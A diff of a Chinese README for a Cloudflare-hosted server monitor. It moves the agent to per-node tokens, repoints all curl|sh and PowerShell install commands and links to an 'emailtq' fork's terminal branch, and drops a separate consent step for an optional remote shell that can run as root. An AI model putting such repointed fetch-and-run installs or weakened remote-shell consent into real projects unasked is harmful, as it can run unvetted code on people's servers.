@@ -15,7 +15,7 @@
 [![GitHub Forks](https://img.shields.io/github/forks/huilang-me/CF-Server-Monitor?style=flat-square&logo=github)](https://github.com/huilang-me/CF-Server-Monitor/forks)
 [![License](https://img.shields.io/badge/License-MIT-16a34a?style=flat-square)](#许可证)
 
-[在线演示](https://demo.huilang.me/) · [API 文档](API.md) · [Go 探针文档](https://github.com/huilang-me/cfsm-agent) · [主题开发](theme-develop.md) · [主题开发 AI 提示词](theme-ai-prompt.md)
+[在线演示](https://demo.huilang.me/) · [API 文档](API.md) · [Go 探针文档](https://github.com/emailtq/cfsm-agent) · [主题开发](theme-develop.md) · [主题开发 AI 提示词](theme-ai-prompt.md)
 
 </div>
 
@@ -25,7 +25,7 @@ CF-Server-Monitor 是一个部署在 Cloudflare Workers 上的服务器监控系
 
 支持主流 Linux 发行版、Alpine Linux、OpenWrt、macOS、群晖 DSM、飞牛 fnOS、Windows 等系统，并提供 Docker 镜像部署方式。
 
-高安全性：默认监控模式下，Agent 仅单向上报指标，终端默认关闭；只有站点、节点授权及 Agent 本地开关均经显式知情同意启用后，才提供可选 Linux Shell 终端。这不是 SSH，也不是文件系统沙箱，Shell 拥有 Agent 服务用户的权限；root Agent 即 root Shell，建议使用非 root 用户降低影响范围。
+高安全性：默认监控模式下，Agent 仅单向上报指标，终端默认关闭。管理员在下载时选择本机终端并执行安装后，才可通过 Worker 同源内置后台使用可选 Linux Shell；站点、节点许可和本地开关仍须满足，但没有额外统一授权操作。这不是 SSH，也不是文件系统沙箱，Shell 拥有 Agent 服务用户的权限；root Agent 即 root Shell，建议使用非 root 用户降低影响范围。
 
 ## 目录
 
@@ -53,9 +53,9 @@ CF-Server-Monitor 是一个部署在 Cloudflare Workers 上的服务器监控系
 相比传统主控式探针，CF-Server-Monitor 更适合低成本、低维护和安全优先的监控场景：
 
 - 免费托管：面板、API、数据库和实时推送都运行在 Cloudflare 上，按免费额度友好设计；默认 60 秒上报间隔可支持约 60 台服务器，改为 120 秒后理论上可翻倍。
-- 单向上报更安全：没有 WebSSH、没有远程命令下发、没有主控通道；Agent 只向 Worker 上报指标。
+- 默认仅监控：终端关闭时 Agent 只向 Worker 上报指标，不提供远程 Shell。可选 Linux 终端需管理员登录和本地安装选择；开启后通过受保护的 WSS 控制通道执行 Shell，不是 SSH。
 - 功能覆盖完整：实时指标、历史图表、地图展示、离线通知、资源告警、到期提醒、主题商店、多语言和移动端适配都已内置。
-- 参数动态下发：后台可修改 Ping 节点、采集间隔、HTTP 上报间隔、WSS 上报间隔、统计网卡、流量重置日、上下行流量校正等参数，Agent 后续自动拉取并生效；Worker 地址、`API_SECRET` 和自动更新开关变更需要重新执行安装命令。
+- 参数动态下发：后台可修改 Ping 节点、采集间隔、HTTP 上报间隔、WSS 上报间隔、统计网卡、流量重置日、上下行流量校正等参数，Agent 后续自动拉取并生效；Worker 地址、节点 token 和自动更新开关变更需要重新执行安装命令。
 - 支持非 root 安装：支持 `systemd --user` 的 Linux 可使用普通用户安装，探针文件写入 `~/.cf-probe/`。
 - 上报时间自动校准：Go Agent 会使用 Worker 响应中的 HTTP `Date` 头校正样本时间和 `boot_time`，降低服务器本地时间错误对历史图表的影响；不会修改系统时间。
 
@@ -68,13 +68,13 @@ CF-Server-Monitor 是一个部署在 Cloudflare Workers 上的服务器监控系
 | 网络质量      | 电信、联通、移动、BGP 节点延迟与丢包率追踪；三网详情开启时首页从 D1 最近 2 小时抽样最多 20 个真实点并缓存 5 分钟 |
 | 多视图前台     | 条形图、环形图、表格、地图视图，支持桌面端和移动端                                                        |
 | 管理后台      | 服务器增删改查、拖拽排序、隐藏服务器、导入导出、批量删除、刷新服务器列表缓存、数据库维护                                               |
-| 多系统 Agent | 主流 Linux、Alpine Linux、OpenWrt、群晖 DSM、飞牛 fnOS、FreeBSD、macOS、Windows，支持 Docker 镜像部署；默认 Go 版本，保留 Shell/PowerShell 版本 |
+| 多系统 Agent | 主流 Linux、Alpine Linux、OpenWrt、群晖 DSM、飞牛 fnOS、FreeBSD、macOS、Windows，支持 Docker 镜像部署；使用维护中的 Go 版本；旧 Shell/PowerShell 仅保留卸载/状态清理 |
 | 实时推送      | Durable Objects + WebSocket，Agent 上报后前端即时刷新                                      |
 | 告警通知      | 离线告警、恢复通知、到期提醒、资源负载告警                                                            |
 | 多语言       | 前端内置中文、英文和西班牙语（拉美）切换；通知消息支持中文、英文和西班牙语；文档提供中文与英文入口              |
 | 多站点       | 支持 GitHub Pages 静态前台和多个 Worker API 聚合展示                                          |
 | 小组件       | 提供 iOS Scriptable 小组件脚本，适合移动端快速查看                                                |
-| 安全控制      | API Secret、管理员密码、JWT、Turnstile、CORS、CSP 白名单                                      |
+| 安全控制      | 每节点独立 token、管理员密码、JWT、Turnstile、CORS、CSP 白名单                                      |
 | 主题生态      | 内置主题、Mikus 模式、主题商店、第三方主题反代与预览                                                    |
 | 额度友好      | 按月表轮换、历史查询采样、缓存与限流设计，适配 Cloudflare 免费额度                                          |
 
@@ -82,7 +82,7 @@ CF-Server-Monitor 是一个部署在 Cloudflare Workers 上的服务器监控系
 
 ```mermaid
 flowchart LR
-  Agent["Server Agent<br/>Go / Shell / PowerShell"] -->|"POST /update"| Worker["Cloudflare Worker"]
+  Agent["Server Agent<br/>Go Agent"] -->|"POST /update"| Worker["Cloudflare Worker"]
   Worker --> D1["Cloudflare D1<br/>servers / settings / history"]
   Worker <--> DO["Durable Object<br/>WebSocket broadcast"]
   Worker --> Assets["Vue Dashboard<br/>Admin Panel"]
@@ -93,7 +93,7 @@ flowchart LR
 
 1. 在管理后台添加服务器，复制安装命令。
 2. 目标服务器安装 Agent，按上报间隔向 Worker 发送指标。
-3. Worker 校验 `API_SECRET`，写入 D1，并通过 Durable Object 广播实时数据。
+3. Worker 校验 `Authorization: Bearer <node-token>`，绑定节点后写入 D1，并通过 Durable Object 广播实时数据。
 4. 前台大盘、详情页、管理后台和 iOS 小组件读取同一套 API。
 
 近期变化：
@@ -108,7 +108,15 @@ flowchart LR
 - `2.8.0`：新增主题商店，支持一键切换第三方主题。
 - `2.7.x`：重构数据库写入、月表轮换、通知模块、安全策略、服务器计费字段、导入导出和多项后台能力。
 
-Go Agent 的完整更新记录见 [cfsm-agent releases](https://github.com/huilang-me/cfsm-agent/releases)。
+Go Agent 的完整更新记录见 [cfsm-agent releases](https://github.com/emailtq/cfsm-agent/releases)。
+
+## 节点凭证迁移与发布前提
+
+当前代码不兼容旧共享 `secret` 或独立 `TERMINAL_TOKEN` Agent：必须在兼容版本发布后逐节点重装。节点 ID、指标、配置与历史保留；普通 token 读取稳定，终端默认关闭。
+
+当前 fork 公开的 `v1.1.6` 尚不支持本次节点 token 协议，未在本次工作中发布新 Agent。后台仅提供有同 tag CLI `token-file` / `register-key` 能力证据和对应原生资产的下载；旧 tag/latest 无证据时 Copy 禁用。Docker 仅有镜像存在证据不足，目前不可用。本文命令是兼容版本发布后的接口示例，不代表已有产物可安装。
+
+Worker-hosted 旧 Shell/PowerShell Agent 安装、运行路径已淘汰并在改动服务或文件前报错，指向维护安装器；卸载/状态清理仍保留，Linux/Alpine/OpenWrt/DSM/macOS/Windows 平台没有删除。
 
 ## 快速部署
 
@@ -116,7 +124,7 @@ Go Agent 的完整更新记录见 [cfsm-agent releases](https://github.com/huila
 
 - Cloudflare 账户
 - GitHub 账户
-- 一个足够复杂的 `API_SECRET`，同时作为 Agent 上报密钥和初始后台密码
+- 可选 `API_SECRET` 仅用于首次管理员密码引导；已配置管理员密码的站点无需此变量。它不是 Agent 凭证。
 
 建议优先使用「Cloudflare Workers 连接 GitHub 仓库」或「GitHub Actions 自动部署」。一键部署适合快速体验，但后续同步更新不够方便。
 
@@ -129,7 +137,7 @@ Go Agent 的完整更新记录见 [cfsm-agent releases](https://github.com/huila
 3. 创建 Worker，并选择从 GitHub 仓库导入本项目。
 4. 构建命令填写 `npm run build:frontend`。
 5. 部署命令使用 `npx wrangler deploy`。
-6. 部署完成后，在 Worker 的 Variables and Secrets 中添加 `API_SECRET`。
+6. 如需首次管理员密码引导，可在 Worker 的 Variables and Secrets 中配置随机强 `API_SECRET`；首次登录后设置独立管理员密码。
 
 图文教程：<https://huilang.me/cf-server-monitor-setup/>
 
@@ -149,7 +157,7 @@ Go Agent 的完整更新记录见 [cfsm-agent releases](https://github.com/huila
 | `CF_API_TOKEN`         | 是  | Cloudflare API Token     |
 | `CF_ACCOUNT_ID`        | 是  | Cloudflare Account ID    |
 | `D1_DATABASE_ID`       | 是  | D1 数据库 ID                |
-| `API_SECRET`           | 是  | Agent 上报密钥和初始后台密码        |
+| `API_SECRET`           | 否  | 可选首次管理员密码引导；不用于 Agent 上报 |
 | `CORS_ALLOWED_ORIGINS` | 否  | 允许跨域访问 API 的来源，多个用英文逗号分隔 |
 
 推送到 `main` 分支会自动部署，也可以在 Actions 页面手动运行 `Deploy to Cloudflare Workers` 工作流。
@@ -161,7 +169,7 @@ Go Agent 的完整更新记录见 [cfsm-agent releases](https://github.com/huila
 部署时请确认：
 
 - Build command 使用 `npm run build:frontend`
-- `API_SECRET` 改为随机强密码，不要继续使用默认值
+- 如使用 `API_SECRET` 引导首次登录，请配置随机强密码；不存在公开默认密码
 - 登录后台后尽快修改管理员用户名和密码
 
 一键部署不方便长期同步上游更新，正式使用更建议迁移到方式一或方式二。
@@ -181,9 +189,9 @@ https://你的 Worker 域名/admin#/admin
 | 项目  | 默认值          |
 | --- | ------------ |
 | 用户名 | `admin`      |
-| 密码  | `API_SECRET` |
+| 密码  | 已配置的管理员密码；未配置时可使用可选 `API_SECRET` 引导 |
 
-登录后建议立即修改后台用户名和密码。后台登录密码可以和 `API_SECRET` 分离；服务器 Agent 上报仍使用 Cloudflare 环境变量中的 `API_SECRET`。
+登录后立即设置独立管理员用户名和密码。JWT 使用数据库中的独立随机 `jwt_secret`，不使用 `API_SECRET` 或默认值签名。Agent 只使用每节点 token。
 
 ### 添加服务器
 
@@ -193,42 +201,40 @@ https://你的 Worker 域名/admin#/admin
 4. 点击复制按钮，选择目标系统和 Agent 版本。
 5. 在目标服务器上执行复制出的安装命令。
 
-如果服务器数量较多，也可以在「设置 → 站点设置」中开启 **自动发现**：安装 Agent 时不传 `-id`，首次上报时服务端会自动创建服务器，名称取 `-name` 参数，未传则使用请求的连接来源 IP（`CF-Connecting-IP`）。若已存在同名服务器则不会新建也不会复用，服务端直接拒绝本次上报（返回 404），Agent 输出提示后直接退出。新建的服务器最多延迟约 2 分钟出现在首页；建号失败、或服务端未开启自动发现（空 `id` 上报只收到普通 404）时，同样只输出一条提示后退出，不重试、不发送通知，也不留下任何标记文件。该开关默认关闭。
+如果服务器数量较多，可在「设置 → 站点设置」开启 **自动发现**，然后点击复制按钮，明确获取一次短期登记 key。每次打开会发行新 key 并使上一把失效；编辑 OS、版本、名称或代理不会换 key。key 有效期 15 分钟、最多登记 100 个新节点，关闭、登出、过期后不保留。
 
-自动发现开关保存后，后台「站点设置 → 自动发现」旁会出现复制按钮，可直接复制下面这种不传 `-id` 的 Linux 安装命令。
+Agent 先通过 HTTPS `POST /api/agent/register`、`Authorization: Bearer <registration-key>` 换取 `{serverId, token}`，再持久化节点 token 并上报。登记 key 不保存在本地配置或报告中。名称使用 `-name`，留空使用连接来源 IP；同名始终建立独立新节点，不获取已有节点的凭证。正常重装复用已有本地 token，不重复登记。
 
-不传 `-id` 时的安装命令（Linux、OpenWrt、Synology DSM、FreeBSD、macOS）：
+兼容版本发布后，Linux、OpenWrt、Alpine、Synology DSM、FreeBSD、macOS 的登记命令示例：
 
 ```bash
-# 名称取本机公网 IP
-curl -fsSL https://raw.githubusercontent.com/huilang-me/cfsm-agent/main/install.sh | sh -s -- install -secret=SECRET -url=WORKER_URL
-
-# 指定名称
-curl -fsSL https://raw.githubusercontent.com/huilang-me/cfsm-agent/main/install.sh | sh -s -- install -secret=SECRET -url=WORKER_URL -name=hk-1
+curl -fsSL https://raw.githubusercontent.com/emailtq/cfsm-agent/terminal/install.sh | sh -s -- install -register-key=REGISTRATION_KEY -url=https://monitor.example.com/update -name=hk-1 -terminal=0
 ```
 
-Windows（管理员 PowerShell），同样去掉 `-id`：
+Windows（管理员 PowerShell）：
 
 ```powershell
 $script = "$env:TEMP\install-cf-probe.ps1"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/huilang-me/cfsm-agent/main/install.ps1" -OutFile $script -UseBasicParsing
-PowerShell -ExecutionPolicy Bypass -File $script install -secret=SECRET -url=WORKER_URL -name=hk-1
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/emailtq/cfsm-agent/terminal/install.ps1" -OutFile $script -UseBasicParsing
+PowerShell -ExecutionPolicy Bypass -File $script install -register-key=REGISTRATION_KEY -url=https://monitor.example.com/update -name=hk-1 -terminal=0
 ```
 
 ## Agent 参数与安全建议
 
-V2.8.3 起默认使用独立项目 [cfsm-agent](https://github.com/huilang-me/cfsm-agent)，安装后服务名为 `cf-probe`。新增服务器后建议直接从管理后台复制安装命令，后台会按目标系统、服务器 ID、Worker 地址和当前参数生成完整命令。
+V2.8.3 起默认使用独立项目 [cfsm-agent](https://github.com/emailtq/cfsm-agent)，安装后服务名为 `cf-probe`。新增服务器后建议直接从管理后台复制安装命令，后台会按目标系统、服务器 ID、Worker 地址和当前参数生成完整命令。
 
-完整安装路径、日志查看、状态检查和升级行为见 [https://github.com/huilang-me/cfsm-agent](https://github.com/huilang-me/cfsm-agent)。
+完整安装路径、日志查看、状态检查和升级行为见 [https://github.com/emailtq/cfsm-agent](https://github.com/emailtq/cfsm-agent)。
 
 ### 常用参数
 
 | 参数                            | 说明                           | 默认值  |
 | ----------------------------- | ---------------------------- | ---- |
-| `-id`                         | 服务器唯一 ID                     | 必填（开启自动发现时可省略） |
+| `-id`                         | 非秘密节点标识；如提供必须与 token 绑定节点一致 | 可选，登记后持久化 |
 | `-name`                       | 自动建号时的服务器名称                   | 连接来源 IP（`CF-Connecting-IP`） |
-| `-secret`                     | Agent 上报密钥，需要等于 `API_SECRET` | 必填   |
-| `-url`                        | Worker 上报地址                  | 必填   |
+| `-token` / `-token-file`        | 一个节点 token 或绝对路径私有 token 文件；与 `-register-key` 互斥 | 普通安装必填其一 |
+| `--install-node-token`          | 安装器安全暂存同一个 token 并传给 `-token-file` | 后台自动生成 |
+| `-register-key`                | 短期登记 key；换取独立节点 token，不长期保存 | 仅新节点登记 |
+| `-url`                        | HTTPS Worker 上报地址，通常为 `<site>/update` | 必填 |
 | `-collect_interval`           | 本机采集间隔；`0` 表示不额外采样           | `0`  |
 | `-interval`                   | 上报间隔，单位秒                     | `60` |
 | `-ct` / `-cu` / `-cm` / `-bd` | 自定义网络质量测试节点，支持 `host[:port]` | 内置节点 |
@@ -257,8 +263,8 @@ loginctl enable-linger 用户名
 ```bash
 docker run -d --name cf-probe --restart=unless-stopped --network=host \
   -v cf-probe-data:/data \
-  -e SERVER_ID=<服务器ID> -e SECRET='<API_SECRET>' -e WORKER_URL=https://<你的后台地址>/update \
-  ghcr.io/huilang-me/cfsm-agent:latest
+  -e SERVER_ID=<服务器ID> -e NODE_TOKEN='<NODE_TOKEN>' -e WORKER_URL=https://<你的后台地址>/update \
+  ghcr.io/emailtq/cfsm-agent:latest
 ```
 
 采集间隔、上报间隔、Ping 节点、网卡、流量重置日、上下行校正等运行参数由 Agent 按 `SERVER_ID` 从后台动态拉取，无需在命令中重复指定；更换镜像标签即回退/升级到指定版本。卸载容器：
@@ -267,15 +273,18 @@ docker run -d --name cf-probe --restart=unless-stopped --network=host \
 docker rm -f cf-probe && docker volume rm cf-probe-data
 ```
 
+Docker 命令仅说明统一 `NODE_TOKEN` 接口；当前未发布经验证支持此协议的镜像，后台下载会禁用 Docker Copy，不应运行旧镜像。
+
 ## 可选 Linux 终端
 
-终端不是 SSH：Agent 在本机创建 PTY，通过独立 WSS 与每节点一个 `TerminalBroker` 连接。站点、节点授权和 Agent 本地 `-terminal=1` 必须同时启用，默认关闭；远程监控配置不能开启本地终端。每节点最多四个独立会话，新标签页创建新 Shell，不替换其他会话。
+终端不是 SSH：Agent 在本机创建 PTY，通过独立 WSS 与每节点一个 `TerminalBroker` 连接。默认终端关闭；管理员在下载中选择启用并执行本地安装，安装动作设置所需站点/节点许可，本机 `-terminal=1` 仍是必需条件，无额外统一授权步骤。远程监控配置不能开启本地终端。每节点最多四个独立会话，新标签页创建新 Shell，不替换其他会话。
 
 ### 启用与权限
 
-1. 先发布支持终端的后端，保持站点关闭。保留原 `v1` / `MetricsBroadcaster`，追加 `terminal-v1` / `TerminalBroker` SQLite DO migration 和 `TERMINAL_BROKER` binding；本地 `wrangler.toml` 与生成它的部署 workflow 必须一致，旧 tag 不可修改。D1 增加 `terminal_nodes`、`terminal_auth_sessions`、`terminal_audit`，不替换监控表。
-2. 更新明确同意参加测试的 Linux Agent，再在内置后台重新登录、显式开启站点并授权节点。启用/授权需再次验证管理员凭据；旧 JWT 缺少 `jti` 时必须重新登录，终端只接受独立 `jwt_secret` 签发的有效管理员 Cookie，不接受 reporting secret 或 Bearer 替代。
-3. 一次性节点 token 与 `API_SECRET` 独立，D1 只存 hash；用安全渠道写入 Agent 所属用户的绝对路径本地文件，再安装/重装时传 `-terminal=1 -terminal-token-file=/absolute/path/node-token`。文件须为 owner-only 普通文件（例如 `chmod 600`），不能是 symlink/FIFO；不把 token 写入命令、截图、日志或仓库。Agent 配置也需仅所属用户可读。参见 [Agent 安装文档](https://github.com/huilang-me/cfsm-agent#readme)。
+1. 使用支持节点 token 协议的 Worker，并等待兼容 Linux Agent 正式发布；没有通过发布能力检查时，后台不会提供可复制安装命令。新安装默认终端关闭，无需先做站点/节点统一授权。
+2. 在 Worker 同源内置后台以有效、可撤销管理员 Cookie 登录，在节点下载弹窗中勾选本次安装启用终端，再到可信目标主机执行命令。勾选只开启所需许可并选择本机安装 opt-in，复用监控的同一个 token，不轮换它；无需另开授权弹窗或提交额外授权操作。旧 JWT 缺少 `jti` 时需重新登录；浏览器终端不接受 node token 或 Bearer 替代管理员 Cookie。
+3. 复制唯一完整安装命令，安装器通过 `--install-node-token` 安全暂存并使用 `-token-file`；无需手动另填终端 token 文件。D1 只保存 SHA-256 hash 和绑定节点 ID 的 AES-GCM 密文，不保存明文。需要手动提供 token 文件时，必须为所属用户的绝对路径、owner-only 普通文件（例如 `chmod 600`），不能是 symlink/FIFO。配置也需仅所属用户可读。
+4. 关闭终端许可不重置 token，不影响监控；「重置节点 Token」同时撤销监控与终端，现有 Shell 关闭，须用新命令重装。hash-only 或不可解密凭证只能明确重置，不能通过读取或勾选静默轮换。命令及 token 可能从 Shell 历史、进程参数、剪贴板或截图泄漏，请仅复制到可信主机，不记录或提交真实凭证。
 
 Shell 权限与 Agent 服务用户相同；root Agent 就是 root Shell，必须明确知情同意，优先非 root。Shell 从该用户 HOME 开始，仅使用固定的无凭据环境，不继承 reporting/token 环境，不读取 bash profile/rc；但这不是文件系统沙箱，同一用户能读取的文件仍能被 Shell 读取。
 
@@ -287,7 +296,7 @@ V1 只在通过可选能力检查的 Linux 开放：需要可用 HOME、Shell、
 - 二进制帧最多 16 KiB，控制帧 4 KiB，尺寸为 1..500 整数；每会话每向 256 KiB credit，四会话每端最多 2 MiB 未确认应用数据（不是总 heap 上限）。生产者有界并批量累计 ACK；输出被解析/输入实际写入后才确认。慢会话不应阻塞其他会话。
 - 配对/启动与无 ACK 进展截止 30 秒，Agent 实际写超时 8 秒，30 分钟无用户活动关闭；输出/心跳不刷新用户空闲。管理员租约 60 秒，UI 每 45 秒续约。撤销、登出、节点旋转/删除、控制连接替换、Agent 重启/升级或续约失败都会结束相关会话；alarm 调度可延后实际关闭，DO `send` 是 enqueue，不是物理写完成保证。
 - 断线不 detached 恢复，不自动重建 Shell 或重放输入。手动重新打开创建新会话；轮换 token 后须安全更新本地配置。终端控制独立于 HTTP 上报与 inactive report-WSS hours，不改变既有采样/上报调度。
-- 仅记录生命周期审计，不持久化终端 bytes/命令；审计清理保留七天并复用既有维护 cron。备份/export/import 不带终端凭据或授权，不激活恢复的终端；恢复后重新显式授权。
+- 仅记录生命周期审计，不持久化终端 bytes/命令；审计清理保留七天并复用既有维护 cron。备份/export/import 不带终端凭据或许可，不激活恢复的终端；恢复后由管理员重新选择终端安装并在本机执行命令。
 
 ### 开发、验收与回滚
 
@@ -295,7 +304,7 @@ V1 只在通过可选能力检查的 Linux 开放：需要可用 HOME、Shell、
 
 本地回归/非 root WSL PTY、模拟 DO reconstruction 和 fake-agent 浏览器不等于真实云验收。仍需单独授权非生产 Worker/D1/DO 与两个 Linux 节点，验证多节点 PTY、真实 hibernation/eviction、资源计量和公网延迟；物理手机键盘/IME/panning 细化仍未验证，暂缓打磨。不得将这些门禁标为通过。
 
-回滚先关闭站点并撤销节点，Agent 显式重装 `-terminal=0`（省略参数会保留旧本地配置）；关闭现有会话，不删除 additive tables、binding/migration 历史或更改旧 tag，监控继续。发布顺序为后端默认关闭、更新同意 opt-in 的测试 Agent、最后显式站点/节点授权和本地启用；未获人类批准不能 push main 或部署生产。
+回滚先关闭站点终端许可并撤销节点终端许可，Agent 显式重装 `-terminal=0`（省略参数会保留旧本地配置）；关闭现有会话，不删除 additive tables、binding/migration 历史或更改旧 tag，监控继续。部署与 Agent 发布仍须单独获批并完成验收；正式可用后，由管理员通过下载中的本地终端选择安装，不再执行独立的站点/节点统一授权流程。未获人类批准不能 push main 或部署生产。
 
 ## 配置说明
 
@@ -303,7 +312,7 @@ V1 只在通过可选能力检查的 Linux 开放：需要可用 HOME、Shell、
 
 | 变量                     | 必填 | 说明                       |
 | ---------------------- | -- | ------------------------ |
-| `API_SECRET`           | 是  | Agent 上报密钥；也是首次登录后台的默认密码 |
+| `API_SECRET`           | 否  | 可选首次管理员密码引导；不用于 Agent 上报 |
 | `API_BASE`             | 否  | 前端请求的 Worker API 地址，多个用英文逗号分隔；用于多 Worker 聚合或前后端分离 |
 | `CORS_ALLOWED_ORIGINS` | 否  | 允许跨域访问 API 的来源，多个用英文逗号分隔 |
 
@@ -445,7 +454,7 @@ smtp://<用户名>:<密码>@<host>:<port>?from=<发件人>&to=<收件人1,收件
 ### API Secret
 
 - 使用随机强密码，不要包含容易被 Shell 或 URL 转义影响的特殊字符。
-- 修改 `API_SECRET` 后，需要重新部署 Worker，并在所有服务器上重新安装或更新 Agent 命令。
+- 修改可选 `API_SECRET` 只影响首次管理员密码引导，不更换节点凭证。节点 token 重置后仅对应节点需要重装。
 - 后台登录密码可以独立修改，建议不要长期和 `API_SECRET` 保持一致。
 
 ### JWT 与 WebSocket 认证
@@ -506,14 +515,14 @@ Go 版本 Agent 会保留原配置，直接执行安装命令即可升级。
 Linux / OpenWrt / Synology DSM / FreeBSD / macOS：
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/huilang-me/cfsm-agent/main/install.sh | sh -s -- install
+curl -fsSL https://raw.githubusercontent.com/emailtq/cfsm-agent/terminal/install.sh | sh -s -- install
 ```
 
 Windows 管理员 PowerShell：
 
 ```powershell
 $script = "$env:TEMP\install-cf-probe.ps1"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/huilang-me/cfsm-agent/main/install.ps1" -OutFile $script -UseBasicParsing
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/emailtq/cfsm-agent/terminal/install.ps1" -OutFile $script -UseBasicParsing
 PowerShell -ExecutionPolicy Bypass -File $script install
 ```
 
@@ -522,7 +531,7 @@ PowerShell -ExecutionPolicy Bypass -File $script install
 Go 版本：
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/huilang-me/cfsm-agent/main/install.sh | sh -s -- uninstall
+curl -fsSL https://raw.githubusercontent.com/emailtq/cfsm-agent/terminal/install.sh | sh -s -- uninstall
 ```
 
 旧 Shell / PowerShell 版本已不再维护，下面命令仅用于清理历史 Shell / PowerShell 安装。请按当初安装时使用的系统脚本选择对应卸载命令；如果当前运行的是 Go Agent，请使用上面的 Go 卸载命令。
@@ -598,11 +607,7 @@ npm run test:history-query
 npm run test:agent-config
 ```
 
-本地 `.env` 至少需要：
-
-```bash
-API_SECRET=123456
-```
+本地秘密应放在未跟踪的 `.dev.vars`。已配置管理员密码时无需 `API_SECRET`；如需首次密码引导，可配置随机强值，不使用示例或默认密码。
 
 ### 测试数据
 
@@ -627,7 +632,6 @@ https://localhost:8787/cdn-cgi/handler/scheduled?cron=0+12+*+*+* // 每天12点�
 
 ```bash
 node test/api-check.js
-node test/api-check.js --base-url=http://localhost:8787 --api-secret=123456
 node test/api-check.js --help
 ```
 
@@ -657,21 +661,19 @@ CF-Server-Monitor/
 
 ## 常见问题
 
-### 部署后返回 `API_SECRET is required`
+### 未配置 `API_SECRET` 能否运行
 
-说明 Worker 没有读取到环境变量。请在 Cloudflare Workers & Pages 的 Variables and Secrets 中删除旧值后重新添加 `API_SECRET`，保存并等待重新部署完成。
-
-目前Cloudflare版本原因，可能需要先改动值保存一次，再改回去触发重新部署。
+可以。它仅为可选首次管理员密码引导；已配置管理员密码与数据库独立 `jwt_secret` 后，站点不需要该变量。旧版报告凭证不是新协议的兼容入口。
 
 ### Agent 没有上报数据
 
-先确认服务器可以访问 Worker URL。如需开启调试，可在安装参数后追加 `-debug=1`。不同系统的日志查看命令不固定，请参考 [cfsm-agent 文档](https://github.com/huilang-me/cfsm-agent) 中对应系统的状态与日志说明。
+先确认服务器可以访问 Worker URL。如需开启调试，可在安装参数后追加 `-debug=1`。不同系统的日志查看命令不固定，请参考 [cfsm-agent 文档](https://github.com/emailtq/cfsm-agent) 中对应系统的状态与日志说明。
 
 排查完成后移除 debug 参数并重新安装，避免日志持续增大。
 
 ### 如何更换 `API_SECRET`
 
-在 Cloudflare 中修改 `API_SECRET`，重新部署 Worker，然后在所有服务器上重新复制并执行安装命令。使用 GitHub Actions 部署时，也要同步更新 GitHub Secret。
+在 Cloudflare 中修改可选首次管理员密码引导变量；它不改变已配置管理员密码、不轮换节点 token，也不要求 Agent 重装。使用 GitHub Actions 时同步其配置。
 
 ### D1 免费额度够用吗
 
@@ -685,7 +687,7 @@ CF-Server-Monitor/
 
 ### 忘记后台密码
 
-进入 Cloudflare D1 数据库 `server-monitor-db`，打开 `setting` 表，编辑 `site_options` 的 `password` 字段。旧版 MD5 兼容值 `e10adc3949ba59abbe56e057f20f883e` 对应密码 `123456`，保存后可用该密码登录，再到后台重新设置强密码。
+通过受信任的 Cloudflare 管理员渠道恢复 `settings` 表中 `site_options` 的管理员密码，保留独立随机 `jwt_secret`，并撤销已有管理员会话。不要写入公开已知密码或示例 hash；恢复后立即设置随机强密码。
 
 ### 未托管在CF的域名不能绑定
 
@@ -738,7 +740,7 @@ echo <CF_CDN_IP> <你的探针域名> | sudo tee -a /etc/hosts
 ## 相关文档
 
 - [API.md](API.md)：REST API、WebSocket、鉴权、错误码和数据结构
-- [https://github.com/huilang-me/cfsm-agent](cfsm-agent)：Go 版本 Agent 配置、升级、日志与排障
+- [https://github.com/emailtq/cfsm-agent](cfsm-agent)：Go 版本 Agent 配置、升级、日志与排障
 - [theme-develop.md](theme-develop.md)：第三方主题开发
 - [theme-ai-prompt.md](theme-ai-prompt.md)：主题开发 AI 提示词，直接粘贴给 AI 即可按项目规范开发主题
 - [test/README.md](test/README.md)：本地模拟数据和测试流程
